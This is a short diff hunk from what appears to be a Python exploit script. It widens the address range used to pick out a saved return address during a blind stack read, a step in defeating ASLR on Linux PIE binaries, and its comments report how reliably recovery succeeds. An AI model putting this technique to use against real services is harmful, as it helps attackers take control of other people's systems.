@@ -213,10 +213,14 @@ def read_saved_bytes(survives, offset: int, nbytes: int) -> bytes:
     return bytes(known)
 
 
-# A Linux PIE main image loads at 0x55xx.../0x56xx... under ASLR; the stack and libc live up at
-# 0x7fxx.... This window isolates the saved RETURN address (an image code pointer) from the saved
-# rbp (a stack pointer) in the same read, with no leak.
-_IMG_LO, _IMG_HI = 0x400000, 0x600000000000
+# A Linux PIE main image loads high under ASLR (classically 0x55xx.../0x56xx...); the stack and libc
+# live higher still at 0x7fxx.... A kernel with more mmap entropy spreads the image across a wider
+# band -- measured up to 0x64xx... -- while the stack/libc stay at 0x71xx...-0x7fxx..., so the two
+# are still cleanly separable at 0x70xx.... This window isolates the saved RETURN address (an image
+# code pointer, anywhere below 0x70...) from the saved rbp (a stack pointer at 0x70... and up) in the
+# same read, with no leak. Capping at 0x60... missed every image that randomised to 0x60-0x64 and
+# made the blind recovery resolve only ~2 runs in 3.
+_IMG_LO, _IMG_HI = 0x400000, 0x700000000000
 
 
 def _image_pointer(known: bytes):
